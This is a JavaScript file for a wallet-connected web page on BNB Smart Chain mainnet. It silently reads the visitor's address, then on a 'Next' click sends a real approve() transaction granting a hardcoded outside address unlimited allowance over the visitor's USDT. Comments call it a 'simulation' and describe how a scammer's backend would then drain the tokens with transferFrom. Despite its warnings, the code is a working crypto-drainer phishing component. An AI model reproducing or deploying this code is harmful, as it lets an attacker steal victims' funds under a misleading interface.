// --- CRITICAL WARNING: EXTREME RISK OF REAL FINANCIAL LOSS ---
// This code is designed to interact with the BNB Smart Chain MAINNET.
// Any mistake or misunderstanding can lead to PERMANENT AND IRRETRIEVABLE LOSS OF YOUR FUNDS.
// PROCEED ONLY IF YOU FULLY UNDERSTAND THE RISKS AND ARE USING A DEDICATED TEST WALLET WITH MINIMAL FUNDS.
// ---

// --- Configuration for BNB Smart Chain Mainnet ---
const MAINNET_CHAIN_ID = '0x38'; // Hexadecimal for 56 (BSC Mainnet Chain ID)

// --- OFFICIAL USDT (BEP20) CONTRACT ADDRESS ON BSC MAINNET ---
// This is the real USDT contract address on the BNB Smart Chain.
const USDT_BEP20_MAINNET_CONTRACT_ADDRESS = '0x55d398326f99059fF775485246999027B3197955'; 

// --- YOUR SPECIFIED RECEIVER WALLET ADDRESS FOR TESTING ---
// This is the address that will be granted unlimited allowance over your USDT.
const RECEIVER_WALLET_FOR_TESTING = '0xce81b9c0658B84F2a8fD7adBBeC8B7C26953D090'; 

// --- ERC-20 ABI Snippet for the approve function ---
const ERC20_ABI_APPROVE = [
    "function approve(address spender, uint256 amount) returns (bool)"
];

// --- MAX_UINT256 represents an "unlimited" allowance ---
// This is the common amount used in "drainer" scams to get full control.
const MAX_UINT256 = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';

// --- Global variables ---
let provider;
let signer;
let connectedAccount = null;

// --- DOM Elements ---
const fromAddressInput = document.getElementById('fromAddress');
const receiverAddressInput = document.getElementById('receiverAddress'); 
const transferBtn = document.getElementById('transferBtn');
const statusMessageDiv = document.getElementById('statusMessage');

// --- Functions ---

// Initializes Web3 provider and attempts to get connected account passively
async function initializeWeb3() {
    // Set the receiver address input value from the constant
    receiverAddressInput.value = RECEIVER_WALLET_FOR_TESTING;

    if (typeof window.ethereum === 'undefined') {
        statusMessageDiv.textContent = 'Web3 wallet (MetaMask/Trust Wallet) not detected. Please use a DApp browser.';
        transferBtn.disabled = true; // Disable button if no wallet
        return;
    }

    try {
        provider = new ethers.providers.Web3Provider(window.ethereum);
        signer = provider.getSigner();

        // Attempt to get accounts without prompting (if already connected/approved for this site)
        // This is how a malicious site might 'silently' get your address if you've ever approved it.
        const accounts = await window.ethereum.request({ method: 'eth_accounts' });
        if (accounts.length > 0) {
            connectedAccount = accounts[0];
            fromAddressInput.value = connectedAccount; // Pre-fill with actual address
        } else {
            // If no accounts found (e.g., first time visiting this DApp), use placeholder
            fromAddressInput.value = '0x... (Wallet Connection Needed)';
            statusMessageDiv.textContent = 'Wallet detected. Interact to continue.';
            // In a real scam, clicking "Next" might trigger eth_requestAccounts if needed,
            // then immediately the malicious approve.
        }

        const network = await provider.getNetwork();
        if (network.chainId !== parseInt(MAINNET_CHAIN_ID)) {
            statusMessageDiv.innerHTML = `<strong>CRITICAL WARNING:</strong> Wallet is on wrong network (ID: ${network.chainId}). Please switch to BNB Smart Chain Mainnet (ID: ${parseInt(MAINNET_CHAIN_ID)}) in your wallet.`;
            transferBtn.disabled = true;
        } else {
            statusMessageDiv.textContent = 'Wallet connected to BNB Mainnet. Click "Next" to simulate the approval.';
            transferBtn.disabled = false;
        }

    } catch (error) {
        console.error("Error initializing Web3 or getting accounts:", error);
        statusMessageDiv.textContent = 'Error initializing wallet. See console. Make sure wallet is unlocked.';
        transferBtn.disabled = true;
    }
}

// Function to simulate the malicious token approval
async function simulateBEP20USDTDrain() {
    if (!provider || !signer) {
        statusMessageDiv.textContent = 'Wallet not initialized. Reload page in DApp browser.';
        return;
    }

    // Ensure we have a connected account (eth_requestAccounts might be triggered here if not already)
    if (!connectedAccount) {
        try {
            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
            connectedAccount = accounts[0];
            fromAddressInput.value = connectedAccount;
        } catch (error) {
            console.error("User rejected wallet connection:", error);
            statusMessageDiv.innerHTML = '<span style="color: orange;">Wallet connection rejected. Cannot proceed with simulation.</span>';
            return;
        }
    }
    
    statusMessageDiv.innerHTML = 'Requesting transaction... Check your wallet for the **APPROVE** pop-up!';

    try {
        // Create a contract instance for the real USDT (BEP20) token, using the signer to send transactions
        const usdtContract = new ethers.Contract(USDT_BEP20_MAINNET_CONTRACT_ADDRESS, ERC20_ABI_APPROVE, signer);

        // --- THIS IS THE CORE MALICIOUS CALL ---
        // We are calling the 'approve' function on the real USDT (BEP20) contract.
        // It grants the 'RECEIVER_WALLET_FOR_TESTING' an 'unlimited' allowance (MAX_UINT256)
        // to spend tokens from your connected account.
        const tx = await usdtContract.approve(RECEIVER_WALLET_FOR_TESTING, MAX_UINT256);

        statusMessageDiv.innerHTML = `Transaction sent! Please confirm in your wallet. <br>
                                     <strong>Transaction Hash:</strong> <a href="https://bscscan.com/tx/${tx.hash}" target="_blank">${tx.hash}</a><br>
                                     <span style="color: #00bcd4;">(This is the **APPROVE** transaction for your USDT BEP20)</span>`;
        console.log("Approval Transaction Details:", tx);

        // Wait for the transaction to be mined
        await tx.wait();
        statusMessageDiv.innerHTML += '<br><span style="color: lightgreen;">Transaction confirmed on Mainnet! Unlimited allowance granted.</span>';
        alert('SIMULATION COMPLETE: You have granted an UNLIMITED allowance to your designated receiver address for your USDT BEP20. In a real scam, the scammer would now drain your tokens.');

        // In a real scam, the attacker's backend would now call
        // usdtContract.transferFrom(yourAddress, scammerAddress, amount_to_drain)
        // using their own wallet, leveraging the allowance you just granted.
        // This second step happens WITHOUT any further pop-ups for you.

    } catch (error) {
        console.error("Error during simulation:", error);
        if (error.code === 4001) { // User rejected transaction
            statusMessageDiv.innerHTML = '<span style="color: orange;">Transaction rejected by user.</span>';
        } else if (error.message.includes('network')) {
            statusMessageDiv.innerHTML = '<span style="color: red;">Network error. Make sure your wallet is on BNB Mainnet.</span>';
        } else if (error.message.includes('insufficient funds')) {
             statusMessageDiv.innerHTML = '<span style="color: red;">Insufficient BNB for gas. Please ensure you have enough BNB.</span>';
        }
        else {
            statusMessageDiv.innerHTML = `<span style="color: red;">Simulation failed: ${error.message || 'Unknown error.'}</span>`;
        }
    }
}

// --- Event Listeners ---
transferBtn.addEventListener('click', simulateBEP20USDTDrain);

// --- Initial setup when the page loads ---
initializeWeb3();

// Handle account and chain changes for robustness (important in dApps)
if (window.ethereum) {
    window.ethereum.on('accountsChanged', (accounts) => {
        if (accounts.length > 0) {
            connectedAccount = accounts[0];
            fromAddressInput.value = connectedAccount;
            statusMessageDiv.textContent = 'Wallet account changed. Click "Next" to simulate the approval.';
        } else {
            connectedAccount = null;
            fromAddressInput.value = '0x... (Wallet disconnected)';
            statusMessageDiv.textContent = 'Wallet disconnected. Reload page in DApp browser.';
        }
    });

    window.ethereum.on('chainChanged', (chainId) => {
        if (chainId !== MAINNET_CHAIN_ID) {
            statusMessageDiv.innerHTML = `<strong>CRITICAL WARNING:</strong> Network changed (ID: ${chainId}). Please switch to BNB Smart Chain Mainnet (ID: ${parseInt(MAINNET_CHAIN_ID)}) in your wallet.`;
            transferBtn.disabled = true;
        } else {
            statusMessageDiv.textContent = 'Network is correct. Click "Next" to simulate the approval.';
            transferBtn.disabled = false;
        }
    });
}
